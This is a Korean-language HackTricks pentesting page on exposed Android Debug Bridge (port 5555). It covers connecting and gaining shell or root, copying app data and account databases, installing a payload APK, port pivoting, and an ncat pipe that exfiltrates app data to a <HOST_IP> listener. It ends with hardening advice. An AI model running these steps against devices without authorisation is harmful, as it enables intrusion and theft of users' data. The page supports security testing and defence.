# 5555 - Android Debug Bridge

{{#include ../banners/hacktricks-training.md}}

## 기본 정보

From [the docs](https://developer.android.com/studio/command-line/adb):

Android Debug Bridge (adb)는 Android 기반 장치 및 에뮬레이터와 통신하기 위한 명령줄 도구입니다. 일반적인 작업에는 패키지 설치, 디버깅 및 장치에서 대화형 Unix 셸을 얻는 것이 포함됩니다.

- 역사적 기본 TCP 포트: 5555 (클래식 "adb tcpip" 모드).
- 현대 무선 디버깅 (Android 11+)은 TLS 페어링 및 mDNS 서비스 검색을 사용합니다. 연결 포트는 동적이며 mDNS를 통해 발견됩니다; 5555가 아닐 수 있습니다. 페어링은 adb pair host:port 다음에 adb connect로 수행됩니다. 공격적 의미에 대한 주석은 아래를 참조하십시오.

Example nmap fingerprint:
```
PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge device (name: msm8909; model: N3; device: msm8909)
```
## Connect

ADB가 노출되어 있고 접근 가능하다면, 빠르게 연결하고 열거해 보세요:
```bash
adb connect <ip>[:<port>]      # Default is 5555 for classic mode
adb devices -l                 # Confirm it shows as "device" (not unauthorized/offline)
adb shell                      # Get an interactive shell (uid usually shell)
whoami; id; getprop ro.debuggable ro.secure service.adb.tcp.port
adb root || true               # Works on eng/userdebug/insecure builds, many emulators/IoT
```
- 만약 장치가 ADB 인증을 강제하는 경우 (ro.adb.secure=1), 사전 인증(USB RSA 인증)이 필요하거나 Android 11 이상의 무선 디버깅 페어링을 사용해야 합니다(이는 장치에 표시된 일회성 코드가 필요합니다).
- 일부 벤더 이미지, 엔지니어링/사용자 디버그 빌드, 에뮬레이터, TV, STB 및 개발 키트는 인증 없이 또는 adbd가 루트로 실행되는 상태로 adbd를 노출합니다. 이러한 경우, 일반적으로 셸 또는 루트 셸에 직접 접근하게 됩니다.

일반 ADB 명령 참조는 다음을 참조하십시오:

{{#ref}}
../mobile-pentesting/android-app-pentesting/adb-commands.md
{{#endref}}

## 빠른 포스트 익스플로잇

셸에 접근한 후, 권한 및 SELinux 컨텍스트를 검증하십시오:
```bash
id; getenforce; getprop ro.build.type ro.product.model ro.build.fingerprint
```
### 데이터 열거 및 캡처

- 서드파티 앱 및 경로 나열:
```bash
pm list packages -3
pm path <pkg>
```
- 루트 권한이 있는 경우 (adb root 또는 su 사용 가능), /data에 직접 접근할 수 있습니다. 그렇지 않으면 디버깅 가능한 앱에 대해 run-as를 사용하는 것이 좋습니다:
```bash
# 루트 없이, 디버깅 가능한 앱의 경우
run-as <pkg> sh -c 'cd /data/data/<pkg> && tar cf - .' | tar xf - -C ./loot/<pkg>

# 루트가 있는 경우
cp -a /data/data/<pkg> /sdcard/<pkg>
exit
adb pull "/sdcard/<pkg>"
```
- 유용한 시스템 아티팩트 (루트 필요):
- /data/system/users/0/accounts.db 및 관련 AccountManager 데이터
- /data/misc/wifi/ (구버전의 네트워크 구성/키)
- /data/data/<pkg> 아래의 앱 전용 SQLite DB 및 shared_prefs

이를 사용하여 민감한 정보를 검색할 수 있습니다 (예: 앱 비밀). Chrome 데이터 고려 사항에 대한 노트는 [여기](https://github.com/carlospolop/hacktricks/issues/274)에서 참조하십시오.

### 코드 실행 및 페이로드 전달

- 런타임 권한 설치 및 자동 부여:
```bash
adb install -r -g payload.apk         # -g는 매니페스트에 선언된 모든 런타임 권한을 부여합니다
adb shell monkey -p <pkg> -c android.intent.category.LAUNCHER 1
```
- 활동/서비스/브로드캐스트를 직접 시작:
```bash
adb shell am start -n <pkg>/<activity>
adb shell am startservice -n <pkg>/<service>
adb shell am broadcast -a <action>
```

### 포트 포워딩 및 피벗팅

루트 없이도 adb는 로컬 포트를 장치 포트로, 장치 포트를 로컬 포트로 포워딩할 수 있습니다. 이는 장치에서 로컬로 바인딩된 서비스에 접근하거나 공격자 서비스를 장치에 노출하는 데 유용합니다.

- 호스트->장치 포워딩 (호스트에서 장치 로컬 서비스에 접근):
```bash
adb forward tcp:2222 tcp:22       # 장치가 SSH를 실행하는 경우 (예: Termux/Dropbear)
adb forward tcp:8081 tcp:8080     # 앱의 로컬 디버그 서버 노출
```
- 장치->호스트 역방향 (장치가 호스트의 서비스에 접근):
```bash
adb reverse tcp:1080 tcp:1080     # 장치 앱이 이제 127.0.0.1:1080으로 호스트:1080에 접근할 수 있습니다
```
- 소켓을 통한 파일 유출 (sdcard 쓰기 없음):
```bash
# 호스트에서: 수신 대기
ncat -lvp 9000 > dump.tar
# 장치에서: tar로 디렉토리 전송 (루트 또는 run-as 적용 가능)
adb shell "tar cf - /data/data/<pkg>" | ncat <HOST_IP> 9000
```

## 무선 디버깅 (Android 11+)

현대 Android는 장치 측 페어링 및 mDNS 검색을 통해 TLS로 보호된 무선 디버깅을 구현합니다:
```bash
# On the device: Developer options -> Wireless debugging -> Pair device with pairing code
# On attacker host (same L2 network, mDNS allowed):
adb pair <device_ip>:<pair_port>   # Enter the 6-digit code shown on device
adb mdns services                  # Discover _adb-tls-connect._tcp / _adb._tcp services
adb connect <device_ip>:<conn_port>
```
노트
- 포트는 동적입니다; 5555를 가정하지 마십시오. mDNS 서비스 이름은 다음과 같습니다:
- _adb-tls-pairing._tcp (페어링)
- _adb-tls-connect._tcp (페어링된 연결)
- _adb._tcp (레거시/일반)
- mDNS가 필터링되면, 일부 빌드에서는 고전 USB 지원 활성화가 여전히 작동할 수 있습니다: `adb tcpip 5555` 다음 `adb connect <ip>:5555` (재부팅 전까지).

공격적 의미: 장치 UI와 상호작용할 수 있다면 (예: 물리적 접근 또는 모바일 MDM 잘못 구성) 무선 디버깅을 활성화하고 페어링 코드를 볼 수 있습니다. 이 경우 케이블 없이 장기적으로 페어링된 ADB 채널을 설정할 수 있습니다. 일부 OEM은 페어링 없이 엔지니어링/개발 이미지에서 TCP를 통해 ADB를 노출합니다—항상 확인하십시오.

## 강화 / 탐지

수비자는 도달 가능한 adbd (TCP)가 중요한 위험이라고 가정해야 합니다.

- 필요하지 않을 때 ADB 및 무선 디버깅을 비활성화하십시오. 개발자 옵션에서 USB 디버깅 권한을 취소하십시오.
- 신뢰할 수 없는 세그먼트에서 수신 TCP/5555 및 mDNS 기반 ADB 검색을 차단하는 네트워크 정책을 보장하십시오.
- 귀하의 제어 하에 있는 장치에서:
```bash
settings put global adb_enabled 0
setprop service.adb.tcp.port -1   # TCP 수신 비활성화 (또는 사용: adb usb)
stop adbd; start adbd             # 데몬 재시작
```
- 기업 네트워크에서 mDNS 레코드 `_adb._tcp`, `_adb-tls-connect._tcp`, `_adb-tls-pairing._tcp`를 모니터링하고 예상치 못한 5555 리스너에 대한 경고를 설정하십시오.
- 불안전한 빌드에 대한 인벤토리: `getprop ro.debuggable`, `ro.build.type`, 및 `ro.adb.secure`.

## Shodan

- android debug bridge
- port:5555 product:"Android Debug Bridge"

## 참조

- Android Developers – Android Debug Bridge (adb): https://developer.android.com/studio/command-line/adb
- AOSP – ADB over Wi‑Fi, pairing and mDNS service names: https://android.googlesource.com/platform/packages/modules/adb/+/refs/tags/android-vts-15.0_r2/docs/dev/adb_wifi.md
{{#include ../banners/hacktricks-training.md}}
